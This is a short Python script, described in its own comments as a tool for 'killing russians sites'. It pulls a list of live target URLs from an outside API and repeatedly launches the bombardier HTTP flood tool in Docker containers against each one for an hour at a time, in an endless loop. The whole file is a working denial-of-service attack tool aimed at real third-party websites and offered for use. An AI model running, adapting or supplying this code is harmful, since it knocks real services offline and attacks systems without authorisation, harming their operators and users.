# This is a simple Python script for killing russians sites.
# Ruskii korabl idi nahuy
import requests
import json
import docker
from settings import *
import time


def kill_servers():
    urls = json.loads(requests.get('https://itarmy.pp.ua/api/?type=online').text)[:LIMIT]

    client = docker.from_env()
    for url in urls:
        cont = client.containers.run("alpine/bombardier:latest", f'-ti -c {CONNECTIONS} -d 3600s -l {url}', detach=True,
                                     remove=True)
        print(cont.logs())


if __name__ == '__main__':
    while True:
        kill_servers()
        print('Time to Sleep')
        time.sleep(3700)

